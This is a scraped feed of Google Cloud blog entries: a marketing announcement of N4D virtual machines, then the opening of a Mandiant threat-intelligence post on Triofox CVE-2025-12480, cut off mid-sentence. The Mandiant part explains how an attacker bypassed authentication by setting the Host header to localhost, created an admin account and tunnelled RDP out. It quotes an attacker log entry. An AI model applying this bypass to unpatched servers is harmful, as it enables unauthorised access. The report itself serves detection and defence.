underline; vertical-align: baseline;\">Google Cloud Console</span></a>.</p>\n</li>\n</ul>\n</ul></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/n4d-vms-based-on-amd-turin-now-ga/",
        "title": "N4D now GA: Gain up to 3.5x price-performance for scale-out workloads",
        "thumbnail": null,
        "author": "Sarthak Sharma",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In today's competitive environment, IT leaders are faced with supporting application scale, rolling out more features, and enabling high-bar customer experiences. This creates a direct and complex challenge: finding the right balance between performance and total cost of ownership (TCO) for the general-purpose workloads that power everyday business operations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we are announcing the general availability of the N4D machine series, the latest addition to Google Compute Engine’s cost-optimized, general-purpose portfolio. Addressing a wide range of workloads, such as web and application servers, data analytics platforms, and containerized microservices, N4D provides a flexible and price-performant solution.</span></p>\n<p><span style=\"vertical-align: baseline;\">The N4D machine series combines Google's </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\"> infrastructure with 5th Gen </span><a href=\"https://www.amd.com/en/products/processors/server/epyc/9005-series.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AMD EPYC™ “Turin” processors</span></a><span style=\"vertical-align: baseline;\">, delivering up to </span><strong style=\"vertical-align: baseline;\">3.5x the throughput for web-serving workloads</strong><span style=\"vertical-align: baseline;\"> vs. the previous-generation N2D. N4D offers predefined shapes of up to 96 vCPUs and 768 GB of DDR5 memory, up to 50 Gbps of networking bandwidth, and </span><a href=\"https://docs.cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\"> Balanced and Throughput storage. To deliver a blended cost savings, N4D allows you to move beyond rigid instance sizing for both compute and storage, with </span><a href=\"https://docs.cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Custom Machine Types</span></a><span style=\"vertical-align: baseline;\"> to independently configure the exact number of vCPUs and amount of memory, complemented with </span><a href=\"https://docs.cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\">, for tuning disk storage performance and capacity. For the most demanding general purpose workloads, pair N4D together with consistently high performance of </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4D</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud provides workload-optimized infrastructure to ensure the right resources are available for every task. Titanium in particular, with its multi-tier offloads and security capabilities, is foundational to that infrastructure. Titanium offloads networking and storage processing to free up the CPU, and its dedicated SmartNIC manages all I/O, ensuring the AMD EPYC cores are reserved exclusively for your application. Titanium is part of Google Cloud’s vertically integrated stack — from the custom silicon in our servers to our </span><a href=\"https://cloud.google.com/about/locations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">planet-scale network</span></a><span style=\"vertical-align: baseline;\"> traversing 7.75 million kilometers of terrestrial and subsea fiber across 42 regions — that is engineered to maximize efficiency and provide the ultra-low latency and high bandwidth to customers at global scale.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A new standard for price-performance</strong></h3>\n<p><span style=\"vertical-align: baseline;\">N4D machine series doesn't just inch past the previous N2D generation; it sprints, delivering up to </span><strong style=\"vertical-align: baseline;\">50% higher price-performance</strong><span style=\"vertical-align: baseline;\"> for general computing workloads and up to </span><strong style=\"vertical-align: baseline;\">70% better price-performance </strong><span style=\"vertical-align: baseline;\">for Java workloads. For web-serving workloads, N4D leverages Titanium and AMD’s Turin processors to drive incredible throughput. This results in up to </span><strong style=\"vertical-align: baseline;\">3.5x the price-performance</strong><span style=\"vertical-align: baseline;\"> vs N2D, driving faster response times and a better overall experience for your end-users.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_2hTLTQA.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>As of October 2025. Performance based on the estimated SPECrate®2017_int_base, estimated SPECjbb2015, and Google internal Nginx Reverse Proxy benchmark scores run in production. Price-performance claims based on published and estimated list prices for Google Cloud.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"Chronosphere\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Chronosphere.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“Our edge proxy fleet and internal data pipelines observed a</i> <b><i>3-4x performance improvemen</i></b><i>t on Google Cloud's N4D instances compared to N2D. Our benchmarks also show N4D processes the same workload with significantly greater consistency while using just a fraction of the CPU. This leap in price-performance allows us to efficiently scale our general-purpose workloads, and fits neatly in our fleet alongside more specific Google compute products we leverage.”</i> - Matt Schallert, Member of Technical Staff, Chronosphere</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"MediaGo\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/MediaGo.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“A</i> <b><i>10% increase in throughput while cutting costs by up to 50%</i></b><i> is a massive win for TCO optimization. That's what we achieved on Google Cloud's N4D machine series. For MediaGo, this efficiency is critical. It allows our AI-driven advertising platform to scale more cost-effectively, directly supporting our mission to maximize ROI for our global partners.”</i> - MediaGo</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"phoronix\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/phoronix.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"The move from N2D to N4D is a significant generational leap. This</i><b><i> 144.14% performance uplift over 152 tests</i></b><i> is a testament to Google's Titanium, unlocking the full potential of the new AMD EPYC 'Turin' processors. For those looking for the best possible price-performance in Google Cloud, the N4D instances are a clear winner.\"</i> - Michael Larabel, Founder and Principal Author, Phoronix (Read the full study <a href=\"https://www.phoronix.com/review/google-cloud-n4d-amd-epyc-turin\">here</a>.)</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"amd\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/amd_LIvoHWP.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"With the launch of the new N4D instances, Google Cloud now offers</i> <b><i>the most comprehensive portfolio based on our 5th Gen AMD EPYC processors</i></b><i>, marking a significant milestone in our strategic partnership. N4D machine series combines the leading performance of AMD CPUs with the uniqueness of Google's Custom Machine Types to deliver a remarkable uplift in price-performance, flexibility, and cost-optimization for everyday workloads. Our benchmark tests confirm this, showing measured performance gains of up to 75% over the previous generation N2D machine series for media encode and transcode workloads.\"</i> – Ryan Rodman, Sr Director, Cloud Business Group, AMD</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Complementing C4D machine series</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Earlier this year, we introduced our general-purpose </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4D machine series</span></a><span style=\"vertical-align: baseline;\"> built on the same underlying processor as N4D. Its consistently high performance and enterprise features like advanced maintenance support, larger shapes, and our next-gen Titanium Local SSDs, make C4D a great fit for critical workloads. In fact, customers such as </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads?e=48754805#:~:text=%E2%80%9CSilk%20has%20tested,D%20Officer%2C%20Silk\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Silk</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads?e=48754805#:~:text=%22We%20are%20constantly,Engineer%2C%20Chess.com\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Chess.com</span></a><span style=\"vertical-align: baseline;\"> report greater than 40% improvement in performance with C4D over prior generations. </span></p>\n<p><span style=\"vertical-align: baseline;\">But critical applications are only part of the story. A modern cloud architecture must also run countless general-purpose workloads where flexibility and price-performance are key. That’s why we designed N4D — as a complement to C4D. By leveraging C4D and N4D in tandem, you unlock the full spectrum of enterprise features, performance, flexibility, and cost-optimization, choosing:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">C4D for consistent performance:</strong><span style=\"vertical-align: baseline;\"> This is your solution for the most demanding, latency-sensitive applications. With up to 200 Gbps networking, Local SSD support along with larger shapes up to 384 vCPUs and bare metal options, C4D delivers predictable, high-end performance for large databases, high-traffic ad and game servers, and demanding AI/ML inference workloads.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">N4D for flexible cost-optimization:</strong><span style=\"vertical-align: baseline;\"> This is the engine for the vast majority of your general-purpose workloads. N4D’s leading price-performance, low cost, and flexibility allow you to slash TCO for applications like web servers, microservices, and development environments.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This approach is already delivering real-world results, allowing customers like Verve to optimize their business from both ends.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"verve\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/verve.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p>\"<i>With Google's Gen4 AMD portfolio, we can optimize for both revenue and cost simultaneously.</i> <b><i>C4D provides the consistent peak performance we need for our core ad servers</i></b> <i>— 81% faster than C3D — which directly translates to more revenue from higher fill-rates (successful bid/ask matching). Meanwhile,</i> <b><i>N4D delivers an incredible 2x performance and price-performance over N2D for everyday workloads</i></b><i>, including scale-out microservices with GKE, enabling us to grow while slashing our overall TCO. This 'Better Together' strategy allows us to use the consistently peak performance of C4D for our mission-critical services and the flexible, cost-efficient N4D to aggressively reduce TCO everywhere else — a level of optimization that simply isn't possible with a single VM type elsewhere.” -</i> Pablo Loschi, Principal Systems Engineer at Verve</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">The Custom Machine Type and Hyperdisk advantage</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Custom Machine Types are a key differentiator for Google Cloud, letting you go beyond predefined \"T-shirt sizes\". Instead of forcing your workload into a box, you can tailor the infrastructure to fit your workload's needs, saving on cost. For instance, a memory-intensive workload requiring 16 vCPUs and 70 GB of RAM might typically be placed on a predefined N4D-highmem-16 shape, forcing you to pay for unused resources. With CMTs, you provision the exact 16 vCPU and 70 GB configuration, eliminating that waste and achieving up to </span><strong style=\"vertical-align: baseline;\">17% cost savings</strong><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">With shapes of up to 96 vCPUs and 768 GB of DDR5 memory, the combination of Custom Machine Types and N4D lets you dial in the exact resources you need with flexible vCPU-to-memory ratios along with extended memory support. </span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"symbotic\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/symbotic.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>“At Symbotic, our vision is to revolutionize the global supply chain with an AI-powered robotics platform built for scale and efficiency. This demands an infrastructure that is both powerful and scalable. Google Cloud's N4D VMs, powered by AMD's latest EPYC processors, delivered exactly that. We observed a</i> <b><i>significant 40% performance uplift</i></b> <i>compared to the previous N2D generation, allowing us to cut</i><b><i> our CPU footprint in half</i></b> <i>with no change in simulation speed or fidelity.</i> <i>The ability to pair these gains with Custom Machine Types</i> <i>— a capability unique to Google Cloud — is a game-changer. It allows us to</i> <b><i>precisely sculpt our infrastructure to our workloads</i></b><i> and gain a significant TCO advantage versus other cloud offerings.”</i> - Dan Inbar, Chief Information Officer, Symbotic</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This granular control and TCO advantage extends beyond compute to your storage. Just as Custom Machine Types let you break free from fixed vCPU-to-memory ratios, </span><a href=\"https://cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\"> unbundles storage performance from capacity, letting you independently tune capacity and performance to precisely match your workload’s block storage requirements.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is further enhanced by </span><a href=\"https://cloud.google.com/blog/products/storage-data-transfer/hyperdisk-storage-pools-is-now-generally-available\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk Storage Pools</span></a><span style=\"vertical-align: baseline;\"> for Hyperdisk Balanced volumes, which let you provision performance and capacity in aggregate, rather than managing each volume individually. The result is simpler management, higher efficiency, an easier path for modernizing SAN workloads — all this while helping you lower your storage TCO by as much as </span><a href=\"https://cloud.google.com/blog/products/storage-data-transfer/hyperdisk-storage-pools-is-now-generally-available?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">30-50%</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started with N4D today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Adopting the latest N4D VM series is easy, particularly if you use </span><a href=\"https://cloud.google.com/kubernetes-engine\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine (GKE)</span></a><span style=\"vertical-align: baseline;\">, where our </span><a href=\"https://cloud.google.com/blog/products/compute/adopt-new-vm-series-with-gke-compute-classes-flexible-cuds?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">custom compute classes</span></a><span style=\"vertical-align: baseline;\"> remove the operational hurdles of migrating workloads to new hardware. Just add N4D to your prioritized list of VM types to ensure your workloads have the performance and flexibility they need to scale.</span></p>\n<p><span style=\"vertical-align: baseline;\">N4D is now available in us-central1 (Iowa), us-east1 (South Carolina), us-west1 (Oregon), us-west4 (Las Vegas), europe-west1 (Belgium), and europe-west4 (Netherlands). </span></p>\n<p><span style=\"vertical-align: baseline;\">Check for the latest availability on our</span> <a href=\"https://cloud.google.com/compute/docs/regions-zones#available\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Regions and Zones page</span></a><span style=\"vertical-align: baseline;\"> and deploy your first instance today in the </span><a href=\"https://console.cloud.google.com/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud console</span></a><span style=\"vertical-align: baseline;\"> or with GKE. Learn more about N4D details here in </span><a href=\"https://docs.cloud.google.com/compute/docs/general-purpose-machines#n4d_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<hr />\n<p><sup><em><span style=\"vertical-align: baseline;\">1. 9xx5C-044 - Testing by AMD Performance Labs as of 10/21/2025. N4D-standard-16 score comparison to N2D-standard-16 running FFmpeg v6.1.1 benchmark (average of 2x encode and 2x transcode) on Ubuntu24.04LTS OS with 6.8.0-1021-gcp kernel, SMT On.</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Performance uplift (normalized to N2D):</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_raw_vp9</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">                  1.76<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_h264_vp9</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">               1.76<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_raw_h264</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">               1.71<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_vp9_h264</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">               1.76<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">FFmpeg average</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">                  1.75</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Cloud performance results presented are based on the test date in the configuration. Results may vary due to changes to the underlying configuration, and other conditions such as the placement of the VM and its resources, optimizations by the cloud service provider, accessed cloud regions, co-tenants, and the types of other workloads exercised at the same time on the system</span></em></sup></p></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/triofox-vulnerability-cve-2025-12480/",
        "title": "No Place Like Localhost: Unauthenticated Remote Access via Triofox Vulnerability CVE-2025-12480",
        "thumbnail": null,
        "author": "Mandiant",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Written by: Stallone D'Souza, Praveeth DSouza, Bill Glynn, Kevin O'Flynn, Yash Gupta</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Welcome to the Frontline Bulletin Series</span></h3>\n<p><span style=\"vertical-align: baseline;\">Straight from Mandiant Threat Defense, the \"Frontline Bulletin\" series brings you the latest on the threats we are seeing in the wild right now, equipping our community to understand and respond. </span></p>\n<h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Introduction</span></h3>\n<p><a href=\"https://cloud.google.com/security/products/mandiant-managed-threat-hunting\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant Threat Defense</span></a><span style=\"vertical-align: baseline;\"> has uncovered exploitation of </span><span style=\"vertical-align: baseline;\">an unauthenticated access vulnerability within Gladinet’s Triofox file-sharing and remote access platform. This now-patched n-day vulnerability, assigned </span><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-12480\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2025-12480</span></a><span style=\"vertical-align: baseline;\">, allowed an attacker to bypass authentication and access the application configuration pages, enabling the upload and execution of arbitrary payloads. </span></p>\n<p><span style=\"vertical-align: baseline;\">As early as Aug. 24, 2025, a threat cluster tracked by Google Threat Intelligence Group (GTIG) as UNC6485 exploited the unauthenticated access vulnerability and chained it with the abuse of the built-in anti-virus feature to achieve code execution. </span></p>\n<p><span style=\"vertical-align: baseline;\">The activity discussed in this blog post leveraged a vulnerability in Triofox version 16.4.10317.56372, which was mitigated in release </span><a href=\"https://access.triofox.com/releases_history/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">16.7.10368.56560</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Gladinet engaged with Mandiant on our findings, and Mandiant has validated that this vulnerability is resolved in new versions of Triofox</span><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Initial Detection</span></h3>\n<p><span style=\"vertical-align: baseline;\">Mandiant leverages </span><a href=\"https://cloud.google.com/security/products/security-operations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Security Operations</span></a><span style=\"vertical-align: baseline;\"> (SecOps) for detecting, investigating, and responding to security incidents across our customer base. As part of </span><a href=\"https://cloud.google.com/security/shared-fate\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Security’s Shared Fate</span></a><span style=\"vertical-align: baseline;\"> model, SecOps provides out-of-the-box detection content designed to help customers identify threats to their enterprise. Mandiant uses SecOps’ composite detection functionality to enhance our detection posture by correlating the outputs from multiple rules.</span></p>\n<p><span style=\"vertical-align: baseline;\">For this investigation, Mandiant received a composite detection alert identifying potential threat actor activity on a customer's Triofox server. The alert identified the deployment and use of remote access utilities (using PLINK to tunnel RDP externally) and file activity in potential staging directories (file downloads to </span><code style=\"vertical-align: baseline;\">C:\\WINDOWS\\Temp</code><span style=\"vertical-align: baseline;\">).</span></p>\n<p><span style=\"vertical-align: baseline;\">Within 16 minutes of beginning the investigation, Mandiant confirmed the threat and initiated containment of the host. The investigation revealed an unauthenticated access vulnerability that allowed access to configuration pages. UNC6485 used these pages to run the initial Triofox setup process to create a new native admin account, </span><code style=\"vertical-align: baseline;\">Cluster Admin</code><span style=\"vertical-align: baseline;\">, and used this account to conduct subsequent activities.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Triofox Unauthenticated Access Control Vulnerability</span></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"CVE-2025-12480 exploitation chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: CVE-2025-12480 exploitation chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">During the Mandiant investigation, we identified an anomalous entry in the HTTP log file - a suspicious HTTP GET request with an HTTP Referer URL containing </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\">. The presence of the </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\"> host header in a request originating from an external source is highly irregular and typically not expected in legitimate traffic.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>GET /management/CommitPage.aspx - 443 - 85.239.63[.]37 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/101.0.4951.41+Safari/537.36 http://localhost/management/AdminAccount.aspx 302 0 0 56041</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 2: HTTP log entry</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Within a test environment, Mandiant noted that standard HTTP requests issued to </span><code style=\"vertical-align: baseline;\">AdminAccount.aspx</code><span style=\"vertical-align: baseline;\"> result in a redirect to the Access Denied page, indicative of access controls being in place on the page.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Redirection to AccessDenied.aspx when attempting to browse AdminAccount.aspx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Redirection to AccessDenied.aspx when attempting to browse AdminAccount.aspx</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Access to the </span><code style=\"vertical-align: baseline;\">AdminAccount.aspx</code><span style=\"vertical-align: baseline;\"> page is granted as part of setup from the initial configuration page at </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\">. The </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page is automatically launched after first installing the Triofox software. This page allows the user to set up the Triofox instance, with options such as database selection (Postgres or MySQL), connecting LDAP accounts, or creating a new native cluster admin account, in addition to other details.</span></p>\n<p><span style=\"vertical-align: baseline;\">Attempts to browse to the </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page resulted in a similar redirect to the Access Denied page.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Redirection to AccessDenied.aspx when attempting to browse AdminDatabase.aspx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Redirection to AccessDenied.aspx when attempting to browse AdminDatabase.aspx</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Mandiant validated the vulnerability by testing the workflow of the setup process. </span><span style=\"vertical-align: baseline;\">The Host header field is provided by the web client and can be easily modified by an attacker. This technique is referred to as an HTTP host header attack. Changing the </span><code style=\"vertical-align: baseline;\">Host</code><span style=\"vertical-align: baseline;\"> value to </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\"> grants access to the </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Access granted to AdminDatabase.aspx by changing Host header to localhost\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig5.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Access granted to AdminDatabase.aspx by changing Host header to localhost</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">By following the setup process and creating a new database via the </span><code style=\"vertical-align: 